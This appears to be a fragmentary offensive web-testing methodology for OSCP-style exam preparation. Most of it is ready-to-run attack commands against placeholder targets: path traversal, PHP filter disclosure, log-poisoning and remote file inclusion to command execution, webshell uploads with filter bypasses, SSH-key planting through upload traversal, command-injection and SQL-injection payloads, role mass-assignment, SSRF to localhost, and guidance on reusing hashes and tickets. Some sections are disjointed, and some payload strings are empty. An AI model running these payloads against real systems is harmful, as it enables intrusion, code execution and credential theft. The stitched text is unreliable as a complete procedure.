recognition.where: Find real download/preview/export requests in the behavior map; inspect which filename/path values the normal request accepts.
recognition.sample:
GET /download?file=report.pdf
Content-Disposition: attachment; filename=report.pdf
Body: EXPECTED_REPORT_BYTES
recognition.spot: An application-controlled file selection is the cue to test path confinement; it is not yet arbitrary read.
recognition.confirm: Request a known target-platform file through the real file parameter/path and compare with the normal response. Require recognizable file contents; a reflected filename, error or status change is not a read.
recognition.enabled: A controlled out-of-directory request returns the intended target bytes: the traversal method is available.
recognition.ruledout: An allowlist rejects paths and only serves approved report IDs: this path-selection context is not a traversal route.
recognition.unknown: An error mentioning a path shows influence but not read access; compare normal/control requests and permission/path depth.

methods.procedure:
Linux proof: ```bash curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH ``` Windows proof: ```bash curl -skG --data-urlencode 'file=../../../../../../Windows/System32/drivers/etc/hosts' http://TARGET:PORT/PATH ``` > **Decisive output:** recognizable contents of the requested target file. `200 OK`, a changed template or a filename reflected in an error is not proof.
Variant — traversal occurs in the URL path ```bash curl -sk --path-as-is 'http://TARGET:PORT/static/../../../../etc/passwd' ``` `--path-as-is` prevents curl from collapsing `..` before sending the request.
Variant — basic normalization/filter tests ```text ..%2f..%2f..%2fetc%2fpasswd %2e%2e/%2e%2e/%2e%2e/etc/passwd ....//....//....//etc/passwd ``` Try these only after a plain baseline. Preserve the exact decoding layer that accepted the value.
> **Next:** use discovered user homes, application paths and configuration names to retrieve relevant source, keys or credentials. Send recovered authentication material to Block 5 with its source and identity context.

methods.title: Disclose PHP source through an inclusion wrapper
methods.clue: A PHP page/include parameter and possible access to local application files
methods.conditions: A PHP inclusion sink accepts the filter wrapper and the process can read the source
methods.access: A reproducible application request and a controlled input or access-context comparison
methods.result: Decoded application source without requiring its normal rendered behavior
methods.mechanics: The filter wrapper transforms file bytes before inclusion, allowing source disclosure instead of normal PHP evaluation. A generic file-download endpoint may not accept the same wrapper.
methods.example: Observation: direct inclusion renders a page. Test: request its base64-filtered source. Illustrative output: the decoded result contains database connection logic. Interpretation: follow the credential and use source to map the actual sink.
methods.verify: Decode the response and identify real target source; normal HTML rendering does not prove source disclosure.
methods.failure: Wrapper filtering, missing path or a non-PHP read operation can defeat this route; retain ordinary traversal/source-disclosure evidence separately.

recognition.where: Inspect the normal page selector, PHP technology evidence and any readable source/configuration clue obtained during mapping.
recognition.sample:
Normal link: index.php?page=about
Error for invalid page: include(PAGE.php): failed to open stream
recognition.spot: An include-related error suggests an evaluating PHP sink, unlike an ordinary file-download function.
recognition.confirm: Verify that the actual sink accepts a filter wrapper and returns decodable target source; errors alone do not prove it.
recognition.enabled: The wrapper yields source that decodes correctly: use that source-disclosure method.
recognition.ruledout: The endpoint reads raw bytes through a wrapper-incompatible API: reject this PHP-inclusion hypothesis.
recognition.unknown: PHP branding without sink evidence leaves inclusion unproved; investigate normal request/source behavior first.

methods.procedure:
```bash
curl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php
printf '%s' 'BASE64_DATA' | base64 -d
```

> **Prerequisite:** a PHP file-inclusion sink that accepts the wrapper. The encoded output must decode to target source; a normal rendered page means the wrapper did not disclose source in that context.

methods.title: Turn controlled local file content into inclusion execution
methods.clue: A confirmed evaluating include and a log or file containing attacker-controlled bytes
methods.conditions: Controlled content survives logging; inclusion identity can read it; interpreter evaluates it; requested command facility is available
methods.access: A reproducible application request and a controlled input or access-context comparison
methods.result: Verified command execution under the inclusion process identity
methods.mechanics: LFI alone selects a local file. Execution requires that included bytes be interpreted as code; source displayed as text proves a weaker primitive. Data-wrapper and remote-include variants below have additional URL-inclusion and routing prerequisites.
methods.example: Observation: an include can display a readable access log. Test: place a controlled marker, then the minimal interpreter proof. Illustrative output: the second request returns the target execution identity. Interpretation: command execution is proven; map the session path.
methods.verify: Require command-specific output distinct from the logged payload and record hostname/identity.
methods.failure: Missing log access, escaping or plain-text reading breaks this chain. Data/RFI variants are viable only when their explicitly listed wrapper/configuration and return-route conditions hold.

recognition.where: After a file/include primitive is demonstrated, use readable configuration to locate the actual log and check whether your harmless request marker is present.
recognition.sample: Readable log excerpt: GET / ... User-Agent=LOG_CANARY
recognition.spot: The include/read identity can reach a log containing your controlled input; evaluation and payload preservation still need proof.
recognition.confirm: Separate raw file read from interpreter evaluation, confirm exact file path and encoding, then a minimal command effect.
recognition.enabled: Controlled log bytes are evaluated and the bounded identity proof succeeds: use the inclusion-execution chain.
recognition.ruledout: The log is only served as inert text: rule out execution through this reader while retaining file disclosure.
recognition.unknown: No marker may mean a different log, buffered writes or escaped content; inspect configuration before changing payloads.

methods.procedure:
```bash curl -sk -A '' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` > **Prerequisites:** the controlled header is logged, the web identity can read the exact log, the inclusion sink evaluates PHP and the payload survives encoding. On Windows/XAMPP, investigate application-specific paths such as `C:\xampp\apache\logs\access.log`. > **Decisive output:** the unique command output and target execution identity. If code appears as text, only read/inclusion is proven.
Variant — PHP data wrapper ```bash PAYLOAD=$(printf '%s' '' | base64 -w0) curl -skG --data-urlencode "page=data://text/plain;base64,$PAYLOAD" --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` Requires URL inclusion in the sink and PHP `allow_url_include=On`; it is disabled by default in current PHP configurations.
Variant — remote file inclusion ```bash python3 -m http.server TRANSFER_PORT --bind LHOST curl -skG --data-urlencode 'page=http://LHOST:TRANSFER_PORT/check.php' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` Requires remote URL inclusion, a compatible interpreter and target-to-`LHOST:TRANSFER_PORT` reachability. An absent HTTP request is inconclusive until reachability and filtering are separated.

methods.clue: An upload/import/attachment function
methods.conditions: A valid upload request and permitted account; the server accepts and stores controlled bytes
methods.access: A reproducible application request and a controlled input or access-context comparison
methods.result: A verified write/retrieval primitive with a known server-side identifier
methods.mechanics: Accepted upload, stored filename, retrieval route and filesystem location are distinct facts. Server rename and content transformation can change the resulting capability.
methods.example: Observation: upload returns an object ID. Test: retrieve it independently. Illustrative output: the unique canary appears but the filename was changed. Interpretation: write/retrieval is established; investigate actual handling before execution.

HTTP/1.1 201 Created
{"id":"UPLOAD_ID","url":"/files/UPLOAD_ID"}
recognition.spot: The real upload route, field and response identify a storage/retrieval candidate.
recognition.confirm: Retrieve the canary independently; establish stored bytes, final name and account/context before testing execution.
recognition.enabled: The canary is stored and retrievable: a write/retrieval primitive is verified.
recognition.ruledout: The server only validates and discards the upload: reject the assumed persistent-write capability.
recognition.unknown: A success message without a retrieval/path observation leaves persistence unknown.

methods.procedure:
Create and upload a benign canary:

```bash
printf '%s\n' 'UPLOAD_CANARY_7F31' > probe.txt
curl -sk -b cookies.txt -F 'file=@probe.txt;filename=probe.txt;type=text/plain' http://TARGET:PORT/upload
```

Then verify the returned identifier/path and retrieve the bytes.

> **Record separately:** acceptance, server-side name, storage path, retrieval URL, response content type, filesystem write identity and whether the storage location is executable.

methods.title: Execute an uploaded file through a compatible handler
methods.clue: Uploads are retrievable and the application stack suggests an executable file handler
methods.conditions: Controlled executable content survives validation; final storage/URL is handled by the compatible interpreter; process execution is permitted
methods.access: A reproducible application request and a controlled input or access-context comparison
methods.result: Verified application-server command execution
methods.mechanics: File write crosses into execution only through a consuming interpreter or process. A MIME change may bypass validation while the final storage remains inert.
methods.example: Observation: a script upload is accepted. Test: request its final URL with a minimal command argument. Illustrative output: source downloads instead of running. Interpretation: execution is not proven; seek another handler or write-consumer chain.
methods.verify: Require target command output and identity; acceptance, source download and a 200 status are weaker results.
methods.failure: Check extension mapping, server rename, handler location and content transformation. Do not treat every upload-filter bypass as a shell.

recognition.where: Begin with a verified retrievable upload; inspect final naming, response handling and evidence of the application's actual interpreter.
recognition.sample:
Stored file response:
Content-Type: text/plain
Body: literal uploaded script source
recognition.spot: A retrievable script may be inert. The interesting detail is how the final location is handled, not acceptance of a script extension.
recognition.confirm: Retrieve the exact stored upload and request it through the candidate server-side handler. Verify an attributable identity marker from that request; uploaded bytes or a 200 response alone do not prove execution.
recognition.enabled: The correct final handler executes the minimal proof as the web identity: choose upload-to-execution.
recognition.ruledout: The file consistently downloads/displays as source in non-executable storage: rule out execution at this location.
recognition.unknown: Unknown server rename or storage URL leaves handler selection unresolved.

methods.procedure:
PHP example, only after PHP handler evidence: ```bash printf '%s\n' '' > check.php curl -sk -b cookies.txt -F 'file=@check.php;filename=check.php;type=application/x-php' http://TARGET:PORT/upload curl -skG --data-urlencode 'cmd=id' http://TARGET:PORT/uploads/check.php ``` > **Decisive output:** target command output. A successful upload that downloads, displays source or returns inert text proves write/retrieval only.
Variants — isolate validation layers in Burp Repeater Test one property at a time: - bypass client-side checks by replaying the raw multipart request; - filename case or alternate extension only when the observed server maps it to the interpreter; - multipart `Content-Type` independently from filename and content; - magic bytes only when server behavior shows content inspection; - double extensions/trailing characters only when normalization evidence supports them; - server rename and final response `Content-Type`. ```bash curl -sk -b cookies.txt -F 'file=@check.php;filename=check.pHP;type=image/jpeg' http://TARGET:PORT/upload ``` Changing MIME type is a test of validation, not proof of executable handling.

methods.procedure:
First use a harmless unique filename outside the normal upload directory and verify it through a separate read/listing primitive. Do not overwrite an existing file as a detection test.
Lab-only variant — controlled SSH public-key placement ```bash ssh-keygen -t ed25519 -f ./web_upload_key -N '' cp ./web_upload_key.pub ./authorized_keys curl -sk -b cookies.txt -F 'file=@authorized_keys;filename=../../../../home/USER/.ssh/authorized_keys' http://TARGET:PORT/upload ssh -i ./web_upload_key -p SSH_PORT USER@TARGET ``` Use only in a disposable authorized lab after confirming the exact user/home, SSH service, web write identity, destination semantics and overwrite impact. Failure can mean path normalization, permission denial, SSH policy or a different user—not necessarily that upload path control is absent.

Illustrative output: a consistent uid line appears only in the injected request. Interpretation: establish the OS context before selecting a shell.

recognition.spot: The function and output suggest an OS utility consumer; the parameter's parsing boundary is the candidate.

methods.procedure:
##### Visible-output baseline Start with a benign identity marker appropriate to the inferred operating system: ```bash curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH ``` > **Decisive output:** command output attributable to the target, such as a username/UID that is absent from the normal response. Reflection of the payload is not execution.
Variants — separators, quoting and POST bodies Test only the forms compatible with the observed command and platform: ```text 127.0.0.1; id 127.0.0.1 && id 127.0.0.1 | id 127.0.0.1%0aid ``` ```bash curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -sk -X POST -H 'Content-Type: application/json' -d '{"host":"127.0.0.1;id"}' http://TARGET:PORT/api/PATH ``` For Windows command contexts, use an observed `cmd.exe` or PowerShell boundary before choosing syntax: ```text 127.0.0.1 & whoami 127.0.0.1 | whoami ```
##### Blind timing proof Repeat a control and a bounded-delay request several times: ```bash curl -sk -o /dev/null -w 'control=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1' http://TARGET:PORT/PATH curl -sk -o /dev/null -w 'test=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1;sleep 5' http://TARGET:PORT/PATH ``` Windows candidate after platform evidence: ```text 127.0.0.1 & timeout /t 5 ``` > **Decisive output:** a repeatable delay near the chosen interval relative to multiple controls. One slow response is inconclusive. ##### After command execution ```text Linux: id; hostname; pwd Windows: whoami; hostname; cd ``` Record the execution identity, working directory, shell/parser and egress assumptions. Hand reliable-session work to Block 7; do not treat one command response as an interactive shell.

methods.procedure:
> **Exam boundary:** the current OSCP+ exam guide prohibits SQLmap and other automatic exploitation tools. The following procedure is manual. Recheck the current guide before an exam.

##### 1. Establish query influence

Replay a valid request in Burp Repeater. Change one parameter and compare a normal value, quote, true condition and false condition:

```text
VALUE
VALUE'
VALUE' AND '1'='1
VALUE' AND '1'='2
```

For a numeric context:

```text
1
1 AND 1=1
1 AND 1=2
```

> **Evidence:** a database error, stable true/false response difference, or repeatable database-specific delay. An isolated `500`, WAF block or generic application error is not enough.

##### 2. Authentication-bypass candidate

In an authorized disposable lab, preserve the application's quoting and comment syntax:

```text
' OR 1=1-- -
administrator'-- -
```

> **Verification:** identify the resulting account/session and perform a separate authorized request. A redirect or welcome string alone can be misleading.

##### 3. Determine UNION shape

First establish column count:

```text
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

Or increment `NULL` columns until the query succeeds:

```text
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

Then find a displayed text-compatible column:

```text
' UNION SELECT NULL,'MARKER_7F31',NULL-- -
```

> **Decisive output:** the marker appears in a response location controlled by the injected row. Match the exact column count and data types.

##### 4. Extract only after fingerprinting the DBMS

```text
MySQL:      ' UNION SELECT NULL,version(),NULL-- -
PostgreSQL: ' UNION SELECT NULL,version(),NULL-- -
MSSQL:      ' UNION SELECT NULL,@@version,NULL-- -
```

Use the confirmed DBMS's catalog and concatenation syntax rather than cycling unrelated payloads. Keep each extraction request reproducible in Repeater.

##### 5. Boolean- or time-blind extraction

Choose a stable page marker or content length for true/false comparisons:

```text
' AND SUBSTRING((SELECT version()),1,1)='P'-- -
' AND SUBSTRING((SELECT version()),1,1)='X'-- -
```

DBMS-specific time proofs:

```text
MySQL:      ' AND IF(1=1,SLEEP(5),0)-- -
PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
MSSQL:      '; IF (1=1) WAITFOR DELAY '0:0:5'--
```

> Repeat controls. Time-based results are invalid if application latency overlaps the chosen delay or the condition cannot be changed independently.

Start with a valid captured registration/update request and add one server-owned property: ```bash curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD","role":"administrator"}' http://TARGET:PORT/api/v1/register ``` > **Decisive output:** authenticate as the new/updated identity and perform an administrator-only action. An echoed or stored `role` field may be ignored by authorization logic.
Variant — method mismatch reveals a valid route ```bash curl -ski http://TARGET:PORT/api/v1/users/USER/password curl -ski -X OPTIONS http://TARGET:PORT/api/v1/users/USER/password curl -ski -X PUT -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"password":"NEW_PASSWORD"}' http://TARGET:PORT/api/v1/users/USER/password ``` Use PUT/PATCH only when a `405`, `Allow` header, documentation or JavaScript behavior supports it. Verify the new credential through a separate login.

methods.title: Execute browser code and validate a useful same-origin action
methods.clue: Untrusted input reaches an executable HTML/JavaScript context
methods.conditions: Payload reaches a browser execution sink; any useful privileged action additionally needs a victim context, same-origin access and a valid request state
methods.access: A reproducible application request and a controlled input or access-context comparison
methods.result: Verified browser-context execution and, when enabled, an application privilege/action transition
methods.mechanics: Reflected, stored and DOM-based paths differ in delivery and sink. Browser JavaScript runs with the origin's access; HttpOnly blocks reading a cookie but does not automatically block authenticated same-origin requests.
methods.example: Observation: a stored marker is rendered in an administrator-facing page. Test: establish the actual output context and harmless execution proof. Illustrative output: code executes in that browser origin. Interpretation: assess whether a specific privileged same-origin action is reachable.
methods.verify: Verify execution in the intended origin/role and independently verify any claimed action; reflection alone is not execution.
methods.failure: Encoding, CSP, inert contexts or absent victim interaction can break the chain. Preserve browser execution separately from claimed account takeover.

recognition.where: Locate a normal reflected/stored input and inspect its final HTML/DOM context in the browser rather than treating raw reflection as execution.
recognition.sample:
Rendered context:
UNIQUE_MARKER
Alternate response: <script>...</script>
recognition.spot: The output context and escaping determine whether browser execution is plausible; the second form is escaped text.
recognition.confirm: Verify the actual browser sink/execution, victim origin/role, required interaction and useful authorized same-origin action.
recognition.enabled: Browser execution and the specific privileged action are independently confirmed: choose the appropriate XSS chain.
recognition.ruledout: The value remains inert/escaped in the relevant sink: reject that payload/context.
recognition.unknown: Source reflection without DOM execution evidence leaves the browser effect unknown.

methods.title: Use WordPress component evidence and authorized administration features
methods.clue: WordPress paths/components or an accepted application administrator credential
methods.conditions: Exact component/version or a verified role; file-edit/plugin installation rights and runtime write/execution must be checked
methods.access: A reproducible application request and a controlled input or access-context comparison
methods.result: A component-specific exploit candidate or verified administrative feature-to-execution path
methods.mechanics: WordPress administrator, writable theme/plugin files and operating-system execution are separate facts. Multisite roles, disabled editors and filesystem ownership can remove a familiar route.
methods.example: Observation: a credential opens the dashboard. Test: inspect its real capabilities and whether the supported file/plugin feature is enabled. Illustrative output: the editor is disabled. Interpretation: investigate permitted components/data rather than assuming a theme shell.
methods.verify: Verify application role and any produced execution identity; component names alone do not establish a vulnerable version.
methods.failure: Missing editor, insufficient role or read-only filesystem changes the branch. Use exact exploit prerequisite matching or credential reuse.

recognition.sample:
Observed paths: /wp-login.php, /wp-content/plugins/COMPONENT/
Authenticated dashboard: USER_ROLE
recognition.spot: Product/component and role clues guide two different paths: exact component exploit matching or a permitted administrative feature.
recognition.confirm: Verify build/configuration for a CVE, or actual editor/plugin/file rights plus executable handling for a feature chain.
recognition.enabled: The precise vulnerable feature or permitted file-consumer route is established: select that mechanism.
recognition.ruledout: The account lacks the relevant capability and files are read-only: discard the assumed dashboard-to-shell route.
recognition.unknown: A product path without exact version/feature evidence is insufficient for a public exploit.

methods.procedure:
> **Recognition:** WordPress-specific paths/assets, generator metadata, REST routes or `wp-content`. **Prerequisite:** correct scheme, host header and base path. **Decisive output:** core/plugin/theme identity or an authenticated capability that maps to a concrete prerequisite. ```bash curl -skI https://HOSTNAME/ curl -sk https://HOSTNAME/robots.txt curl -sk https://HOSTNAME/wp-json/ | head curl -sk https://HOSTNAME/wp-content/ curl -sk https://HOSTNAME/wp-login.php -o wp-login.html ``` Inspect page source for `/wp-content/plugins/NAME/`, `/wp-content/themes/NAME/`, versioned assets and alternate base paths. A visible version is a candidate, not exploitability proof.
WPScan inventory ```bash wpscan --url https://HOSTNAME/ --disable-tls-checks \ --enumerate vp,vt,u --plugins-detection mixed \ --output wpscan-HOSTNAME.txt ``` > WPScan can be useful for component/user candidates, but verify every useful result manually. Vulnerability-database details may require an API token; never place a token in published notes or command history.
Validate one legitimately acquired credential and then enumerate the role/capabilities it actually grants. ```bash curl -sk -c wp.cookies -b wp.cookies \ --data-urlencode 'log=USER' \ --data-urlencode 'pwd=PASSWORD' \ --data-urlencode 'wp-submit=Log In' \ --data-urlencode 'redirect_to=https://HOSTNAME/wp-admin/' \ https://HOSTNAME/wp-login.php -D wp-login.headers curl -sk -b wp.cookies https://HOSTNAME/wp-admin/ -o wp-admin.html ``` > A redirect alone is inconclusive. Confirm an authenticated page marker and the actual role. Useful capabilities can include media upload, plugin/theme editing/installation, post editing or administrative account management; each requires separate server-side authorization and execution conditions. XML-RPC exposure is a feature clue, not automatically a vulnerability: ```bash curl -sk -X POST https://HOSTNAME/xmlrpc.php \ -H 'Content-Type: text/xml' \ --data 'system.listMethods' ```

methods.title: Use server-side requests to inspect reachable internal behavior
methods.clue: URL import, preview, webhook or fetch behavior
methods.conditions: The application server performs a controllable request; destination/protocol policy and its network position permit the selected resource
methods.access: A reproducible application request and a controlled input or access-context comparison
methods.result: A confirmed server-side request and a bounded internal read/request capability
methods.mechanics: An external callback proves server-side fetching, not unrestricted internal access. Redirect handling, URL parsing and response visibility determine which follow-on requests are possible.
methods.example: Observation: the controlled listener receives a fetch. Test: compare a justified internal endpoint and an unreachable control. Illustrative output: only an internal HTTP response is reflected. Interpretation: map that application boundary without assuming a general network tunnel.
methods.verify: Verify source/request evidence and the exact returned internal behavior; separate blind fetches from response-readable SSRF.
methods.failure: No callback may be DNS, URL validation, egress or application behavior. Test the first failed boundary and avoid indiscriminate destination guessing.

recognition.where: Browse legitimate import/preview/webhook functions and identify a request whose normal input is a server-fetched URL.
recognition.sample:
Controlled receiver: GET /FETCH_CANARY
Application response: fetched status/preview
recognition.spot: A correlated receiver event supports server-side fetching; it does not establish internal access or response-readable SSRF.
recognition.confirm: Separate client-side fetches, server source, destination/protocol restrictions and response visibility.
recognition.enabled: A permitted controlled internal request and its bounded result are confirmed: use that specific server-request primitive.
recognition.ruledout: The browser fetches directly and the server never requests it: reject server-side request inference.
recognition.unknown: No receiver event can mean URL validation, DNS or egress; identify the first failed boundary.

methods.procedure:
> **Recognition:** URL import, webhook, image/PDF fetch, feed preview, link unfurling or callback validation. **Prerequisite:** a parameter that the server dereferences. **Decisive output:** a request observed at a controlled listener or a stable response difference tied to the destination. Listener: ```bash python3 -m http.server LPORT --bind 0.0.0.0 ``` Hypothetical request replay: ```bash curl -sk 'https://HOSTNAME/fetch?url=http://LHOST:LPORT/ssrf-marker' ``` Interpret the path explicitly: ```text browser/client -> vulnerable application -> requested URL ``` The application, not Kali, must resolve and reach the destination. A browser-side fetch, open redirect or reflected URL does not prove SSRF.
Internal destination and parser variations ```bash # Only after an external controlled callback proves server-side fetching curl -sk 'https://HOSTNAME/fetch?url=http://127.0.0.1:PORT/' curl -sk 'https://HOSTNAME/fetch?url=http://localhost:PORT/' # Preserve encoding when the URL is nested in form data curl -sk -X POST https://HOSTNAME/fetch \ --data-urlencode 'url=http://127.0.0.1:PORT/' ``` > Compare status, body marker, size and timing against a closed-port control. Internal HTTP content establishes reachability/read capability, not command execution.

methods.title: Classify the artifact and its identity context
methods.clue: A secret-like value, key file, stored hash, challenge response or ticket
methods.conditions: Artifact provenance and format; possible local/domain/application identity and compatible protocol
methods.access: A credential artifact with a recorded source and possible account context
methods.result: A typed credential record with a justified use or recovery path
methods.mechanics: An NT hash, Net-NTLMv2 response and DCC2 verifier are not interchangeable. Source and format constrain cracking mode, reuse protocol and expected rights.
methods.example: Observation: a recovered value is labelled a hash. Test: inspect its format and producing source. Illustrative output: it is a challenge-response capture rather than an NT verifier. Interpretation: choose offline recovery; reject direct Pass-the-Hash.
methods.verify: Identify artifact type, source, account/domain and compatible next operation; record unknowns instead of guessing.
methods.failure: A 32-character hexadecimal value is not enough to identify its algorithm. Use application/source evidence and converters.

recognition.where: Return to the file, database row, capture or session that produced the artifact; inspect structure and account labels before choosing a tool mode.
recognition.sample:
Possible structures:
-----BEGIN OPENSSH PRIVATE KEY-----
USER::DOMAIN:CHALLENGE:RESPONSE:BLOB
USER:RID:LM_HASH:NT_HASH:::
recognition.spot: Headers and producing context distinguish a private key, challenge response and stored NT verifier.
recognition.confirm: Record the exact source, user/domain and complete format; identify compatible recovery/authentication operations.
recognition.enabled: Source and format agree on the type: route it to the matching recovery/use method.
recognition.ruledout: The value is an application identifier rather than an authentication artifact: reject the credential hypothesis.
recognition.unknown: A bare hexadecimal string without provenance does not identify its algorithm; investigate the producing application.

methods.procedure:
```text
SOURCE -> MATERIAL/FORMAT -> LOCAL/DOMAIN/APPLICATION IDENTITY
-> POSSIBLE USE -> SERVICE/PROTOCOL -> AUTHENTICATION
-> AUTHORIZATION -> NEW ACCESS -> RE-ENUMERATION
```

Record source, claimed identity, format evidence, possible uses, tested service, result and resulting rights together.

| Material | Recognition | Compatible use |
| --- | --- | --- |
| Cleartext password | Text tied to an identity/source | Normal protocol/application login |
| SSH private key | OpenSSH/PEM private-key block | SSH public-key authentication; recover passphrase offline if protected |
| Linux password record | `USER:$id$salt$digest:...` | Offline recovery with complete record/format |
| Application/file verifier | Tool-specific `$...$` or documented digest | Offline recovery with matching mode/parser |
| NT hash | Usually 32 hex from SAM/LSASS/NTDS context | Offline recovery; PtH where NTLM and the client support it |
| Net-NTLMv2 response | `USER::DOMAIN:challenge:proof:blob` | Offline recovery or live relay under specific conditions; not PtH material |
| DCC2/MSCache v2 | Username-dependent cached-domain verifier | Offline recovery; not ordinary PtH material |
| Kerberos ticket | `.kirbi`, ccache or in-memory cache | Ticket-specific access subject to realm, SPN, validity, clock and route |
| Kerberos roast material | `$krb5asrep$...` or `$krb5tgs$...` | Offline recovery with matching enctype/mode |
| Session/API token | Cookie, bearer/JWT or application token | Issuing application and authorization context only |

Do not feed unknown strings into random modes. Preserve the source and identity context, then identify the format:

```bash
hashid HASH_OR_FILE
john --list=formats | grep -i KEYWORD
hashcat -hh | grep -i KEYWORD
hashcat --example-hashes | less
```

> **Failure cue:** `No hashes loaded`, token/line-length errors or zero parsed hashes normally indicate wrong format, mode, damaged input or unsupported version—not a strong password.

| Output | Type | Immediate compatible possibilities | Not valid as |
| --- | --- | --- | --- |
| Cleartext password | Reusable secret | Password authentication, key derivation, DPAPI where applicable | Proof of authorization |
| NT hash | NTLM key | Offline crack; PTH where NTLM/service policy allows; Kerberos RC4 transition where supported | Net-NTLM response or DCC2 |
| AES128/AES256 key | Kerberos long-term key | Request Kerberos material using compatible tooling | Direct NTLM authentication |
| `.kirbi` / ccache | Kerberos ticket container | Use while valid for its client/realm/SPN scope | Password/hash |
| DCC2/MSCache v2 | Offline verifier | Offline cracking | PTH |
| DPAPI key/blob | Protected-data material | Decrypt only with matching context/keys | General logon credential |
| Machine-account key | Computer identity | Map the computer account's rights and Kerberos/NTLM paths | Human/domain-admin identity |

Every newly usable identity returns to Block 10 before movement:

```text
VERIFY MATERIAL -> AUTHENTICATE SAFELY -> CONFIRM IDENTITY
                -> MAP GROUPS/RIGHTS/SHARES/HOSTS/ROUTES
```
